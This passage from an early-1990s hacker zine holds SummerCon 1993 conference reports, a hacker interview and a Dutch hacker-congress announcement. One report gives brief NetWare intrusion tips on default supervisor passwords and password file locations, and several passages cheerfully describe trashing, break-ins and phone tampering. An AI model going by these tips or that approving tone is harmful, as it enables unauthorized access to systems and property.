     Everyone Else - Sorry I couldn't think of anything clever to say.

     One I would like single out is Erik Bloodaxe, who I have known over the
     phone for 9 years now, but will meet for the first time at this year's
     Summercon, if I get there.  [Ed: He didn't make it]

     Also:  for you hackers that have disappeared from my life, you who had
     my number, my parents' number has never changed, you can contact me
     through them if you like, I would love to hear from you.

How do you see the future of the Underground?

     It's not going to go away.  There will always be new challenges.  There
     are always new toys for curious minds.  There may be a split into
     several different, only partially interlocking 'undergrounds' involving
     different types of technological playing.  In spite of Caller-ID and
     advanced security functions of the new digital switches, there will
     still be many ways to phreak around the phone system:  taking advantage
     of the old Crossbars in remote areas, and by finding some of the
     'pheatures' in new switches.

     Hacking on the Internet will always be around despite who controls the
     net, though I am sure there would be a lot more destructive hacking if
     the mega-corporations take it over.  Security of systems is more a social
     problem than a technological one, there is always a segment of the
     population that is gullible, stupid, or corrupt.  There will always be
     some smartass out there making trouble for the Organization.  Constantly
     evolving systems and brand new systems will present security holes forever,
     though they may be harder to understand as the systems grow more complex.
     With more computers networked there will be a lot more to play with.

     Socially, I am worried about the huge wars that have developed,
     LOD v. MOD, etc.  While hackers have always been contentious, as well
     they should be, the ferocity of attacks has me somewhat stunned.  I will
     leave out blames and suggestions here, but I will just make the
     observation that as any community grows large in size, the intimacy
     that it enjoys will be diminished.

     When the underground was small, isolated, and revered as black magicians
     by outsiders, it was as though we were all part of some guild.  Now that
     there are many more people who have knowledge of, and access to, the
     hacker community, there is little cohesiveness.  I see this getting
     worse.  The solution may be tighter knit groups.  But an outbreak of
     wars between mega-gangs could be a real catastrophe.

     The cyberpunk aesthetic seems to have captivated the underground.
     Some people have to be aware that the community was here before William
     Gibson was patron saint, and that most of us still can't successfully
     "rustle credit" - which means this is a hobby, not a profession.
     Will this change?  Slowly, I imagine.  The trendies will get tired and
     find something else to pretend to be, (maybe dinosaurs, given
     the current popularity of Jurassic Park), and only the hard-core hackers
     will be left.  Some of us may, in time, turn into computer criminals,
     to which I am indifferent, as it won't be me.  The current cyber-hysteria
     has attracted a whole bunch of trendy fakes, and is distracting us from
     what originally brought us, most of us anyway, to hacking/phreaking in
     the first place - the insatiable curiosity, the dance of the mind
     unbounded.

     Will the hype die?  Time will tell.  Sometimes I get so sick of the crap
     I see on IRC that I wish someone would give me back an apple IIe and
     an applecat 212, and set me back down in 1984.  Just call me
     over the hill.

Any end comments?

     Hacking is the art of esoteric quests, of priceless and worthless
     secrets.  Odd bits of raw data from smashed machinery of intelligence
     and slavery reassembled in a mosaic both hilarious in its absurdity
     and frightening in its power.

            The Missouri Programmers' Convention Transcripts

                      Compiled by Synapse 403

For those of you who were at the con, or moreover were at the con
and can remember it (Sir Lance?), these transcripts are for you.
They are not absolute in their accuracy and are most likely full
of holes, however please keep in mind they are the transcribed
product of a hacker who is suffering from a hangover of heroic
proportions, and is typing to keep his mind off the mutiny
happening in his stomach.


Please note that within the transcripts you will find parts of
the speaker's words paraphrased, this is not intended to
misrepresent them, this is simply an easy way to cut to the chase
and get this job done.  Another note to make is that with in this
transcript, several people have been labeled unknown, this is
either due to I could not see their face while they were speaking
or they wished to remain anonymous.  These folks will be labeled
"unknown" keep in mind that this is for the above reasons and not
any slight, or K-RaD At|T|_|D3.

                           SummerCon

Introductions on camera were the essential beginning of the
meeting, with Drunkfux wandering counter clockwise through the
room, pointing the camera (that he was clinically joined with),
in your face and asking your name and to say a bit about yourself.

Surprisingly enough there was little adverse reaction to this
aside from a few quiet jokes in relation to people wondering how
much $ Drunkfux would be getting from SRI for the tape <G>

Stuart Hauser from SRI, Stanford Research Inst. was the first
speaker of the day, he was (or is) a older looking man who looked
relaxed and confident.  He was here to tell us about SRI and their
goals (or he was here to milk the crowd for info, depends who you
talk to I suppose).

SRI is an international corporation, employing over 3000
people, that claims no ties to the Feds, NSA , CIA or any other
government arm interested in harming, persecuting or even
prosecuting the hacker community.

Their main concern is major network security, on a corporate
level.  However there was talk of SRI having contract work for
military related arms producers this was not brought up at the
conference.

He started by talking about himself and SRI, he mentioned their
policy and their feelings towards dealing with the hacker
community on a productive level.  He went on to confirm, that
someone we all know or know of that works for the same company is an
asshole, and we are not the only community to realize this.  I
will leave his name out for reasons of privacy, however a good
hint for those who were not at scon and are reading this his first
name starts with DON.

After allowing us all to laugh this over he went to tell us of
the finding of his teams research form SRI.  His team consisted of
himself, Doug Web, and Mudhead, they were tasked to compile a
report on the computer underground in some nebulous fashion, he
was of course (at least to me and everyone I was sitting with)
not very clear with this.  To the best of our knowledge the report
was like a damage potential report, ie:  How much can the hackers
really do, and HOW much will the hackers do?

Stu conceded that the networks and companies had more to fear
from corporate espionage at the hands of employees and
mismanagement then they did from hackers.  However he fears a
new breed of hackers he says are becoming a reality on the nets,
the hacker for cash, digital criminals.  He felt that this new
breed of hacker will be counterproductive for the both the PD
world and the underground on the basis that if they destroy it
for the corps, we cannot use it either.

In the way of security Stuart felt the Social engineering was
the biggest weakness of any system, and the most difficult to
defend against.  Also he felt too much info about machines and
security of them was public info, also public info was available
for use in social engineering.  He felt that the only way to
combat this is to make the employees and owners of companies more
aware of these threats.  Beyond the social engineering he feels
that physical measure are too weak at most facilities and do not
protect there hardcopy data well enough he meant this both for
Trashing and actual b&e situations again he felt the situation
was to spread awareness.

While conducting the interviews to for this report Stuart formed
his own opinion of the hacker which he shared with us.  He feels
that hackers for the most part are not malicious at all, and are
actually decent members of cyberspace.  Moreover he feels that
hackers should be put to work as opposed to put to jail.
Something we all feel strongly about.  Stuart finished his speech with
brief allusions to scholarships and upcoming programs, at this point he
left the floor open to questions.  The are as follows:

Emmanuel Goldstien:  "Earlier you (Stuart) mentioned the existence
of 'malicious hackers', where are they?"

Stu:  "Holland, Scandinavia, the UK poses a great threat,
Israel, Australia.  The bloc countries for virii and piracy are very
busy right now, We have to wonder what will happen when they get full
access to our nets.  What happens when the eastern bloc catches
up?"

Unknown:  "Who finances this".

Stuart: "Really that's none of your business" (paraphrased <G>)

Unknown:  "Where is the evidence of these so called malicious
hackers, I think the whole malicious hacker idea is spawned by the
media to justify the persecution of hackers".

Stuart:  [Has no chance to reply]

Control-C:  (interjects) "Punk kids are all over the place doing it
man."

KL:  "its common knowledge that it is happening there."

Stu:  (offers example) Was told that at three companies have tried
to hire tiger teams, for corporate breaches however he has no proof
of this.   Yet he feels the sources were reliable.

Unknown:  "I have heard rumors that SRI is writing software to
catch hackers.  is this true?"

Stu:  Says he hasn't heard about this.  However if they are more
interested in what SRI is doing he will be  sticking around until
this afternoon or evening.  And has about 15 copies of the report that
are available to the public.

                      Next speaker

[I was out of the room for this speaker and asked Black Kat to
type this in, so your guess is as good as mine.]

Someone showed a DES encryption laptop, 8 months old, with a built in
chip to encrypt everything in and out (modem, disk, etc).  Didn't have
an overhead projector but was giving personal demos.  Made by BCC
(Beaver Computing Company) out of California.  Doesn't advertise, but
will give sales brochures etc, if you call the 800 number.
Thinks the govt is discouraging wide scale distribution.

                     Count Zero & RDT

Count Zero announced he would be talking on a unique telco
feature they found and about packet radio.  Stickers and
board adds from RDT and cDc were handed out at this time.

White Knight and Count0 started by introducing a bizarre
telco feature they came across, and played a tape recording to
demonstrate some of its features to the crowd.  After some chatter with
the rest of the con, nothing definite was concluded, however, some
good ideas are brought out.  (As well as some insight by folks who have
discovered similar systems.)

Next came some comic relief from Count0 and White Knight in the
way of the termination papers of an employee from a telco, the
employees case report was read to the crowd and essentially painted the
picture of a really disgruntled and ornery operator.  Specifics were read,
and people laughed at the shit this guy had gotten away with, end of
story.

Following this Count0 spoke for Brian Oblivion who could not be
there about an American Database/social program called America 2000.
Brian came across this information by the way of a group in Penn state,
the program is meant to monitor the attitudes of students, and how
they behave with within state standards..

Furthermore the Database is compiled without the knowledge or
permission of parents, beyond this the file can stay with a man
or woman for life, in the hands of the state.

                      Count0 on Packet Radio
                     Self-empowering Technology

Next came the actual Packet radio discussion, Count0 displayed
his hardware and talked at great length on a whole spectrum of issues
related to the radio packet switching, and some points while straying,
even the morality of the FCC.  This went on for quite some time.
Count0 instructed the crowd on the principle behind packet switch
radio as well as explaining which licenses to get and to apply.

                  Drunkfux, Merchandising

Drunkfux

Drunkfux started by, Merchandising a shitload of ho-ho con
shirts, 15$ a piece as well as mthreat his tonloc shirts, also selling the
mods for the Mistubishi 800, mthreat also had a chip preprogrammed for
the Mits 800 avail.  Those who could not get the mod were told to get it
from cypher.com in /pub/vind.  He told us of the new Metal Land revival and
said a bit about it.

Next and most interesting was the discussion of the fate of
Louis Cypher, and his companions in the recent bust.  It seems Cypher
and ALLEGED accomplices Doc and JP have been charged with numerous
felonies not which the least of is Treasury Fraud and b&e of a federal
post office.  Drunkfux went into detail on how they had been turned
on, and essentially entraped into the situation.  Also how the media as
per usual had made a witch hunt out of it by connecting Doc to the a
remote relation to the Kennedys etc, etc.

                    Eric Neilson with CPSR

Eric Nielson started by telling the crowd what had drawn him to
the CPSR, by the way of reading a discussion in congress about a
congressman defending the strength of a Starwars network by stating that the
gov had an excellent example for security: the phone networks in the
USA.  Needless to say Eric had little faith in this analogy <G>.

He went on to describe what the CPSR covers and what they have
done recently in the of the clipper debate, Sundevil and other 1st
Amend. issues.  He discussed the internal workings of CPSR and its
funding police as well as telling Conf Members how to go about joining.

                         Erik Bloodaxe

Erik started out with explaining why Phrack 43 is not yet out.
This is due to the fact that Stormking.com will not allow it to be mailed
from it, seeing as the owner does telco consulting and feels it would
be a conflict of interest.  Furthermore he won't give the listserve to
the Phrack Staff, making it somewhat difficult to distribute.  However KL
is acting as a mediator and hopefully this will be settled soon.
Mindvox was considered but rejected as a choice, for fear of people
getting a hold of the list..

On the issue of Phrack and the copyright, Erik had only ONE fed
register out of all those who collect it.  However Phrack has
obtained logs of both CERT forwarding Phrack by mail, as well as Tymnet
obtaining the mag.

Beyond this Agent Steel was discussed in an "I told you so
fashion" it turns out that him being accused of being a narc in the past
were valid, seeing it was proved by way of documentation that Agent
ratted out Kevin Poulsen (Dark Dante) resulting in his current 19
charges.

And of Course the new LOD issue was broached, however very
little was discussed on it and it was simply agreed to a large degree that
Cameron (lord Havoc) must have been seriously abused as a child to
display the type of obvious brain damage he is afflicted with now.

                       Emmanuel Goldstein 2600

Emmanuel Goldstein in his purple Bellcore shirt discussed with us
his appearance before a Congressional hearing on a panel with Don
Delaney and how the hostility shown towards him by the house
representatives in session.  Beyond this he went on to describe several
nasty letter letters sent to him by telcos for PUBLIC info he had posted
in the winter issue of 2600.  This is a very brief summary of what he had to
say, mainly due to the fact that I was too busy listening to him to
concentrate my apologies go to those who were interested in
reading the whole thing.


Next up was a lengthy discussion on Novel Software and its
weaknesses, By Erreth Akbe however the speaker he wished me to leave
this out of the transcripts so I will respect his wishes in this.

                ********End Of Transcript***********

I would like to thank the following for making the Con an
experience for me that I will not soon forget:

Arist0tle, Black Kat, Butler, Control-C, Erreth Akbe, Tommydcat,
the Public and theNot.   Thx guys.

Presenting :::

      SummerCon 1993 in Review !!!

Hacking Tales and Exploits by the SotMESC

Additional Activities by the GCMS MechWarriors

-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-

     The weather was right, too right.  Something was foul in the
air.  It was akin to that mythical 'Calm before the Storm' scenario
that is dreaded by so many.  But, Scribbles and I boarded the
Techno-Laden SotMESC compact and took off down the Highway to our
ultimate goal . . . Hacker Heaven in Summertime Fun - SummerCon !!!

     Instantly, weather was seen brewing in the Caribbean.  Hints
of Hurricanes echoed through the towns we drifted through.  To
alleviate any anxieties, massive quantities of Jolt! were obtained
in the infamous town of Hatties-Gulch, a small town taken over by
the virulent filth called College Students.

     The trip continued, over hill and over dale.  Dale was quite
considerate not to press charges.  Colleges were passed in a blink
of the eye.  Nothing was going to stop us.  We were on a mission
from the Church.  But, that's another story.

     After locating that famous arch, a beeline was made at speeds
over 100 MPH through St. Louis until our destination came into
view: The St. Louis Executive International (800-325-4850).  We
came to meet our nemesis and friends at the fest hosted by the
Missouri Programming Institute.  Brakes were quickly applied
as the car appeared to be going off the off-ramp and into the ditch.

     From the lobby it was obvious, there were unusual people here.
These were the kind of people that you fear your daughters would
never meet.  The kind of people that kicked themselves into
caffeine frenzies and would become infatuated with virtual lands.
Yes, these were my kind of people.

     Now, the adventure may start . . .

     Oh, and in response to A-Gal on pg 30 of 2600, Scribbles
says she's the sexiest hacker on the nets.  Hmmmmm, I'm inclined
to agree with that.  I'm sure Control-C will agree too, especially
after he trailed her for half of SCon.

     Now, we all know that Friday is the warm-up day on what we can
expect to see at SCon during the main Saturday drag.  It was no
surprise to find the main junction box rewired, pay-phones providing
free services, rooms rerouted and computers running rampant down the
hallways.  But, the traditional trashing of Control-C's room this
early signaled that more would be needed to top the night.  The
maid was definitely not pleased.

     For a list of those that attended, maybe KL can provide us
with that information.  There were too many faces for my fingers
to lap into.  And, there were quite a few new faces.  I believe
that Weevil was the youngest hacker at 16, and Emmanuel was the
oldest, although he didn't give his age.

     -()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-

                         THE CONFERENCE

     -()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-()-

     Let's get to the meat of the matter.  The conference had
a nice spacious central area with tables neatly lining alongside
the wall.  Between the tables and the walls were many hacks packed
as tightly as they could get.  Why didn't we think of moving the tables
closer together ???

     KL took control and ran the conference smoothly.  dFx panned
everyone on his digital camcorder.  Several cameras were around
to provide us with gifs later.  And the conference took off . . .


     First up was Stuart from SRI (Stanford Research Institute).
He elaborated on SRI's being involved in research, engineering and
design.  From studies done around the world with hackers and those
associated, malicious hacking can not be stopped.  There is no
evidence, though, that the current hackers are interested in
bringing the networks down at all.  Concern was given to new
hackers that may be emerging with financial gain and maliciousness
occurring.  The top security hole with system was noted as
being the infamous social engineering technique.  SRI did note
that many places did not utilize the security that they even had
in place.  It was also noted that laws against malicious hackers,
and probably any hacker, should be fair and just.  The most
malicious hacks that are turning up have been spotted in the
following named countries: Holland, Scandinavia countries,
very possibly soon in the UK, Australia, Israel, the former USSR,
and Bulgaria ( noted for virii writers ).

     A voice made mention of Operation Rahab, hackers in German Intelligence.

     Next up was Count Zero from cDc/RDT to talk about packet
radio.  His talk included information about the IESS and handed
out a flyer on America 2000 ( school under 1984 regimes ).
Maybe someone will provide us with a copy of this.  A packet
radio modem at 1200 can be obtained easily for $50.  TCP/IP
packets are already being send over the bandwidth along with
other network protocols.  The usefulness of all this is that
the information is broadcast and it is virgin territory.  The
baud limitation is due only based upon the bandwidth you are
operating at and the number of collisions occurring.  On a
band you can see every packet that is being transmitted if
you wish.  All this is located on a 2 meter band.  Currently
the FCC forbids encryptions on the airwaves, although this is
noted as being virtually impossible to enforce.   It also takes
5 months to get an amateur radio license, and your personal info
is recorded in a book easily obtained at libraries.  The problem
with going around the FCC is that there exist vigilante HAMs that
monitor the bands and have nothing better to do than filter
info and whine to the FCC.  Bandwidths are decreasing though.
This is due to an increased interest overall by communications
in these areas.  Unless you do something major the FCC will
not give you much interest.  The book on preparing yourself for
a Tech Class can be obtained from Radio Shack for $9.

     Next up was dFx.  He was promoting the HCon and Tone-Loc
t-shirts that were for sale.  Merchandising was getting pretty
high.  He also gave out a few Mitsubishi 800 disks.  He was
also recognized as the ONLY and LAST member of the Neon Knights,
a club that had a wide range of comedy names generated.  The
word was put out the HCon '93 will be in December 17-19 with
a hint that it could also wind up being in Austin.  Then the
conversation turned to Lord Byron's bust, which we should here
more information on any day this week.  The conversation
reiterated the government narc that was at the AA meeting
that was pressuring Byron.  Byron was also noted as having
rejected a plea bargain the courts offered him.  And lastly,
it is going to happen soon so get them while you can.  The
FTP site at eff.org will be dropping its CuD directory due
to a conflict of interest with EFFs major contributors, mainly
the RBOCs and other interest groups that don't like us.

     Erik Bloodaxe took the table next to talk about what
was happening with his involvement with Phrack and some
interesting info about Agent Steel.  As for Phrack, the
Email list is being with-held by Tuc.  The mailing list
has been refused at Mindvox due to files missing mysteriously
at that site.  And, no organization registered for Phrack #42
since it was copyrighted with a nice and lengthy preamble,
except for one company from Mitre.  Currently Phrack #43 is
in limbo and is estimated at 1 Meg long.  Going onto the
info about Agent Steel, basically he's a narc.  Lord Havok from
Canada is trying to restart the LOD under some unknown
logical rationale that since LOD is defunct, anyone can
reclaim the name.  Lord Havoc, aka Cameron, has been going
around trying to get documentation to put together an LOD
technical journal #5.  Supposedly there is a skin-head group
in Canada that in now tracking Cameron down.

     Someone came up next [Minor Threat] and gave us an update on
Codec.  Two weeks after the last SCon, Codec was pulled over while
on the run from the law for speeding and then arrested for
burglary, resisting arrest, etc . . .  He is estimated to
be out of jail in 1995 and still has time to serve in a few
other states.  Mail can be sent to him at this address:
codec@cypher.com.  Maybe Crunch can give Codec some hints on
how to get by in prison?

       From the CPSR, Eric Nielson took the table.  He elaborated
on the CPSR and ran a Q&A period.  Basically, the CPSR files many
FOIA requests and sues the government.  Their focus is on the
workplace computing.  Elaboration was given on the Clipper Chip
and computer ship security.  The CPSR is staffed with lawyers
and takes their funding from dues and grants.  They are not
sponsored by any corporations.

     From the far side of the table came the infamous Emmanuel
Goldstein from 2600.  He stated how he had testified at congress and
gave them a live demonstration of bandwidth scanning and redboxing.
While he was there, the inquisition started against him on the
issue of 2600.  Emmanuel then tried to explain the culture to
our representative that it is bad to classify all hackers as
criminals.  Goldstein then went on to talk about the DC 2600 bust
and how it has resulted in 2600 meetings springing up all across
the country.  A review of several films on software piracy at
the office, disaster recovery and viruses from Commonwealth
Films was given.  And, to highlight everything, 2600 has purchased
an AT&T van that they plan to take to assorted conventions and
start a fleet of these up.

     Pst, BTW, on pg 43 of 2600 the intersection should be a jump =:)

     Last up was Erreth Akby, a Certified Netware Engineer.  He
explained that the only upgrade in Novell 4.0 is the disk compression.
He also informed us that the supervisor and guest accounts generally
have default passwords.  TO hack into this Net, you should use a PC
with full alt and functions keys.  The supervisor p/w is on the
RConsole in a file called autoexec.mcf on version 3.11.  Netcrack
will not work on a system with Intruder Lock-Out.  Non-dedicated
netware must boot from a floppy.  Best of all, you can dial out
by using cubix-quarts, which are PC with modems on the system.

     Below is a quick reprint of a paper that was recovered
from Control-C's trashed room.

Mrs Jasnagan,

     I would like to set up a meeting
to discuss Kevin's progress in Social
Studies and English.  Please let
me know when it would be
convenient.

                 Thank you

                      ( Scribble , scribble )

Dear Mr + Mrs Gormby,

     We would be happy
to meet with you at
9:30 on Thursday, April
1st in Room 104

                     Sincerely,
                         M.Jarnagin
                            &
                         S.Dietrich


     Now, could this be Kevin Poulson ???  Naaa, no way.
Amazing what technical data trashing will uncover.  I guess
I should throw this away now . . .

     After the convention, there was much rejoicing.  The reasons
would become fairly obvious as a 'swingers party' sign was soon
located outside one of the hotel wings.  Yes, it would be a very
good convention.

     Several people made their way to the vehicles for a long
night of trashing and raiding of the various FedEx, UPS and
other assorted boxes around town.  Other groups made their
way to computers that were trying to connect with anything
they could out in town.  There were also those that reluctantly
went to the mall to take advantage of the local population.

     What did not happen ???  Control-C did not get laid, but
it was rumored that there were a few 12-year olds wandering
around the hotel looking for this legendary hacker.  No deaths
had occured, the fires were kept to a minimum and nothing major
was noted as being broken.

     One thing was for sure, there were a lot of alcoholic
beverages going around, walkie-talkies, scanners, and wild
tales.  Several area buildings were broken into, but nothing
major was done.

     Then the shit hit the fan.  It seems several hackers had riled
the swingers into a frenzy.  I guess the swingers couldn't swing
with it.  What happened ???  Phones went ringing room to room and
radios blared to life that the cops were here !!!  At count, there
were 6 cops, 1 sheriff and 4 hotel employees that started patrolling
the hallways.  Yes, we were under room arrest at our own convention
in our own wing.  Anyone that left there room was told to stay there
or they would be arrested.  The cops were very insistent that no
pictures were to be taken.  The swingers had broken our balls.

     But, this would not stop us.  Soon, there was a phone network
going on with radio interfaces.  The windows opened and a few migrated
to other locations of the hotel.  After a while, the authorities left
feeling satisfied that they had intimidated us.  They didn't.

     After they left, the hallways erupted again.  In the SotMESC
room a gathering turned out to watch several techno-infested
videos.  At the cDc room were others viewing the HoHoCon '92 film
that dFx brought down with him.  At one point, the microwave
around the lobby was detonated and a mysterious stack of Credit
Card carbons was found.  The liberated phones were being
utilized to their full international extent, and several of the
soda machines decided to give out a few free drinks.

     But, we couldn't leave well enough alone.  Sir Lance went
to the lobby and took a picture of the hotel Asst. Manager.
I guess this guy didn't like his photo being taken, since he
turned around and called the cops on Sir Lance.  Down the hallway
the cops came, dragging Sir Lance back with them.  In the end,
the cops explained to the Asst. Manager that it was not a crime
in the US to take pictures of people.

     In another related story, Kaos Wizard wound up calling the
SotMESC room with a wild plea for help.  It seemed he was with
a large group of trashers that included Albatross, Intrepid,
Forced Entry, Zippy, The Public and more.  Kaos was at a Central
Office close to the hotel on Woodson and needed help.  He had
taken off to take a piss and noticed that the trashers were
surrounded by cops when he returned.  There was no way he was going
back with all those cops there ( and, might I mention, there was
also a police dog ).  Mystic Moos gathered up a few people and
went to rescue Kaos Wizard as the rest of the trashers returned
to the hotel.  It seems they had eluded the cops by telling them
that they were waiting for their friend to return from taking
a bathroom break ( Kaos Wizard ).  Unfortunately, he never
returned.  The cops let them go eventually.  Mystic Moos rescued
Kaos Wizard, and the hotel was aglow in activity again.

     Control-C came down the hall at one point to make a startling
discovery.  It seems that at a local club there was a band playing
that featured 'Lex Luthor'.  The elusive X-LOD founder had been
located.  AFter some thought, it was decided he could stay there
and sing the blues while the rest of us partied the night away.

     For those interested, the hotel fax is 314-731-3752.

     One of the police officers detaining us was S.M. Gibbons.

     IBM will send a 36 page fax to the number you give them.
To activate, call 1-800-IBM-4FAX.  As you can imagine, it wasn't
long before the hotels fax ran out of thermal paper.

     Below is a gathering of Flyers . . .

            Top 25 Things I Learned at SummerCon '93
                --------------------------------
                          By Darkangel


     SummerCon is a place where many hackers from all over the
world meet to discuss the current state of hacking today, and to
drink themselves under the table.  Every year, pages and pages of
useful information is passed and traded among the participants.
In this brief summery, I will attempt to point out the things
that I learned and I thought were the most helpful to the whole
hacker community. I hope you enjoy it.

     #1)  DON'T let Control-C within 15 feet of any person that
     does not have a penis.

     #2)  Knight Lightning will have a stroke before the age of
     30.

     #3)  French Canadians ALWAYS sound drunk.

     #4)  Loops do not make good pickup lines.

     #5)  The Zenith is outside the window.  Just look up.

     #6)  Smoking certain herbs is still illegal in St. Louis.

     #7)  If you see a taxi and think it might be a cop, it
     probably is.

     #8)  Hotel Security is worse than Mall Security.

     #9)  The payphones in the lobby are not meant to be free.

     #10)  Do not climb through the ceiling to get to the room
     with the PBX in it.

     #11)  Do not glue the locks shut on an entire floor of the
     hotel. (especially when people are in them)

     #12)  This machine is broken.

     #13)  Do not dump bags you got trashing on the floor of
     someone else's room.

     #14)  St. Louis police do not appreciate the finer points of
     Simplex lock hacking.

     #15)  VaxBuster should never be allowed to drink Everclear.

     #16)  Scribbles has a very nice ass.

     #17)  Do not photograph Pakistani hotel security guards.

     #18)  Do not try to bring a six pack through customs.

     #19)  Loki is the Fakemail God.

     #20)  Do not rip the phone boxes out of the walls and cut
     the wires.

     #21)  Barbie Doll pornos can be cool.

     #22)  Frosty can do weird things with techno and movies.

     #23)  Always remove the mirrors from the walls to check for
     hidden cameras.

     #24)  Do not threaten or harass other people staying at the
     same hotel.  This can be bad.

     #25)  I really don't think the hotel will let us come back.

     That wraps it up!  See you at HoHoCon!

                                       -Darkangel

                   1993 SUMMER CONGRESS, THE NETHERLANDS

=========================================================================

HEU?

Remember the Galactic Hacker Party back in 1989? Ever wondered what
happened to the people behind it? We sold out to big business, you
think. Think again, we're back!

That's right. On august 4th, 5th and 6th 1993, we're organizing a
three-day summer congress for hackers, phone phreaks, programmers,
computer haters, data travellers, electro-wizards, networkers, hardware
freaks, techno-anarchists, communications junkies, cyberpunks, system
managers, stupid users, paranoid androids, Unix gurus, whizz kids, warez
dudes, law enforcement officers (appropriate undercover dress required),
guerilla heating engineers and other assorted bald, long-haired and/or
unshaven scum. And all this in the middle of nowhere (well, the middle
of Holland, actually, but that's the same thing) at the Larserbos
campground four meters below sea level.

The three days will be filled with lectures, discussions and workshops
on hacking, phreaking, people's networks, Unix security risks, virtual
reality, semafun, social engineering, magstrips, lockpicking,
viruses, paranoia, legal sanctions against hacking in Holland and
elsewhere and much, much more. English will be the lingua franca for
this event, although one or two workshops may take place in Dutch.
There will be an Internet connection, an intertent ethernet and social
interaction (both electronic and live). Included in the price are four
nights in your own tent. Also included are inspiration, transpiration, a
shortage of showers (but a lake to swim in), good weather (guaranteed by
god), campfires and plenty of wide open space and fresh air. All of this
for only 100 dutch guilders (currently around US$70).

We will also arrange for the availability of food, drink and smokes of
assorted types, but this is not included in the price. Our bar will be
open 24 hours a day, as well as a guarded depository for valuables
(like laptops, cameras etc.). You may even get your stuff back! For
people with no tent or air mattress: you can buy a tent through us for
100 guilders, a mattress costs 10 guilders. You can arrive from 17:00
(that's five p.m. for analogue types) on August 3rd. We don't have to
vacate the premises until 12:00 noon on Saturday, August 7 so you can
even try to sleep through the devastating Party at the End of Time
(PET) on the closing night (live music provided). We will arrange for
shuttle buses to and from train stations in the vicinity.

HOW?

Payment: in advance please. Un-organized, poor techno-freaks like us
would like to get to the Bahamas at least once. We can only guarantee
you a place if you pay before Friday June 25th, 1993. If you live in
Holland, just transfer fl. 100 to giro 6065765 (Hack-Tic) and mention
'HEU' and your name. If you're in Germany, pay DM 100,- to Hack-Tic,
Konto 2136638, Sparkasse Bielefeld, BLZ 48050161. If you live elsewhere:
call, fax or e-mail us for the best way to get the money to us from your
country. We accept American Express, we do NOT cash ANY foreign cheques.

HA!

Very Important: Bring many guitars and laptops.

ME?

Yes, you! Busloads of alternative techno-freaks from all over the
planet will descend on this event. You wouldn't want to miss that,
now, would you?

Maybe you are part of that select group that has something special to
offer! Participating in 'Hacking at the End of the Universe' is
exciting, but organizing your very own part of it is even more fun. We
already have a load of interesting workshops and lectures scheduled,
but we're always on the lookout for more. We're also still in the
market for people who want to help us organize during the congress.

In whatever way you wish to participate, call, write, e-mail or fax us
soon, and make sure your money gets here on time. Space is limited.

'Networking for the masses',   Wednesday August 4th 1993, 15:30

One of the main discussions at the 1989 Galactic Hacker Party focused on
whether or not the alternative community should use computer networking.
Many people felt a resentment against using a 'tool of oppression' for
their own purposes. Computer technology was, in the eyes of many,
something to be smashed rather than used.

Times have changed. Many who were violently opposed to using computers
in 1989 have since discovered word-processing and desktop publishing.
Even the most radical groups have replaced typewriters with PCs. The
'computer networking revolution' has begun to affect the alternative
community.

Not all is well: many obstacles stand in the way of the 'free flow of
information.' Groups with access to information pay such high prices for
it that they are forced to sell information they'd prefer to pass on for
free. Some low-cost alternative networks have completely lost their
democratic structure. Is this the era of the digital dictator, or are we
moving towards digital democracy?

To discuss these and other issues, we've invited the following people
who are active in the field of computer networking: [Electronic mail
addresses for each of the participants are shown in brackets.]

Ted Lindgreen (ted@nluug.nl) is managing director of nlnet. Nlnet is the
largest commercial TCP/IP and UUCP network provider in the Netherlands.

Peter van der Pouw Kraan (peter@hacktic.nl) was actively involved in the
squat-movement newsletters 'Bluf!' and 'NN' and has outspoken ideas
about technology and its relation to society. Had a PC all the way back
in 1985!

Maja van der Velden (maja@agenda.hacktic.nl) is from the Agenda
Foundation which sets up and supports communication and information
projects.

Joost Flint (joost@aps.hacktic.nl) is from the Activist Press Service.
APS has a bbs and works to get alternative-media and pressure groups
online.

Felipe Rodriquez (nonsenso@utopia.hacktic.nl) is from the Hack-Tic
Network which grew out of the Dutch computer underground and currently
connects thousands of people to the global Internet.

Andre Blum (zabkar@roana.hacktic.nl), is an expert in the field of
wireless communications.

Eelco de Graaff (Eelco.de.Graaff@p5.f1.n281.z2.fidonet.org) is the
nethost of net 281 of FidoNet, EchoMail troubleshooter, and one of the
founders of the Dutch Fidonet Foundation.

Michael Polman (michael@antenna.nl) of the Antenna foundation is a
consultant in the field of international networking. He specialises in
non-governmental networks in the South.

Alfred Heitink (alfred@antenna.nl) is a social scientist specializing in
the field of computer-mediated communication as well as system manager at
the Dutch Antenna host.

Rena Tangens (rena@bionic.zer.de), was involved in the creation of the
Bionic Mailbox in Bielefeld (Germany) and the Zerberus mailbox network.
She is an artist and wants to combine art and technology.

The discussion will be led by freelance radiomaker and science
journalist Herbert Blankesteyn. He was involved in the 'Archie'
children's bbs of the Dutch VPRO broadcasting corporation.
=========================================================================

'Phreaking the Phone',   Thursday August 5th 1993, 14:00

Your own telephone may have possibilities you never dreamed possible.
Many years ago people discovered that one could fool the telephone
network into thinking you were part of the network and not just a
customer. As a result, one could make strange and sometimes free
phonecalls to anywhere on the planet. A subculture quickly formed.

The phone companies got wise and made a lot of things (nearly)
impossible. What is still possible today? What is still legal today?
What can they do about it? What are they doing about it?

Billsf (bill@tech.hacktic.nl) and M. Tillman, a few of the worlds best
phreaks, will introduce the audience to this new world. Phone phreaks
from many different countries will exchange stories of success and
defeat. Your life may never be the same.
=========================================================================

'Hacking (and) The Law',   Friday August 6th, 14:00

You can use your own computer and modem to access some big computer
system at a university without the people owning that computer knowing
about it. For years this activity was more or less legal in Holland: if
you were just looking around on the Internet and didn't break anything
nobody really cared too much...

That is, until shortly before the new computer crime law went into
effect. Suddenly computer hackers were portrayed as evil 'crashers'
intent on destroying systems or, at least, looking into everyone's
files.

The supporters of the new law said that it was about time something was
done about it. Critics of the law say it's like hunting mosquitoes with
a machine-gun. They claim the aforementioned type of hacking is not the
real problem and that the law is excessively harsh.

To discuss these issues we've invited a panel of experts, some of whom
are, or have been, in touch with the law in one way or another.

Harry Onderwater (fridge@cri.hacktic.nl), is technical EDP auditor at the
Dutch National Criminal Intelligence Service (CRI) and is responsible for
combatting computer crime in the Netherlands. He says he's willing to
arrest hackers if that is what it takes to make computer systems secure.

Prof. Dr. I.S. (Bob) Herschberg (herschbe@dutiws.twi.tudelft.nl), gained
